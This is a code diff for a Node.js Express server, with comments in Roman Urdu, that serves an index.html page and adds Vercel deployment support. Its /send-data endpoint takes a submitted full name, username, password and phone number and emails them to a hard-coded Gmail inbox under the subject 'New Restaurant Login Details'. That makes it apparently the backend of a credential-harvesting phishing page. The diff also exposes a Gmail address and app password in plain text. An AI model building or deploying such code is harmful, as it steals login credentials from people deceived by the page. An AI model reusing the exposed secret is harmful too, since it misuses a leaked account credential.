@@ -1,17 +1,26 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
+const path = require('path');
 
 const app = express();
 app.use(express.json());
 app.use(cors());
 
+// Static HTML/CSS files serve karne ke liye
+app.use(express.static(__dirname));
+
+// Main page (index.html) serve karne ke liye
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 // Nodemailer setup
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'lagharitahir08@gmail.com', // Apni Gmail ID
-        pass: 'mcfn tmzh qnxd ghaa'       // Gmail ka App Password
+        user: 'lagharitahir08@gmail.com',
+        pass: 'mcfn tmzh qnxd ghaa' // App Password
     }
 });
 
@@ -19,8 +28,8 @@ app.post('/send-data', (req, res) => {
     const { fullname, username, password, phone } = req.body;
 
     const mailOptions = {
-        from: 'lagharitahir08@gmail.com', // Corrected email
-        to: 'lagharitahir08@gmail.com',   // Corrected recipient email (added @gmail)
+        from: 'lagharitahir08@gmail.com',
+        to: 'lagharitahir08@gmail.com',
         subject: 'New Restaurant Login Details',
         text: `Nayi Login Details aayi hain:
         
@@ -41,7 +50,13 @@ Phone Number: ${phone}`
     });
 });
 
-const PORT = 3000;
-app.listen(PORT, () => {
-    console.log(`Server ${PORT} port par chal raha hai.`);
-});
+// Local run karne ke liye aur Vercel ke liye support
+if (process.env.NODE_ENV !== 'production') {
+    const PORT = 3000;
+    app.listen(PORT, () => {
+        console.log(`Server ${PORT} port par chal raha hai.`);
+    });
+}
+
+// Vercel ke liye export
+module.exports = app;
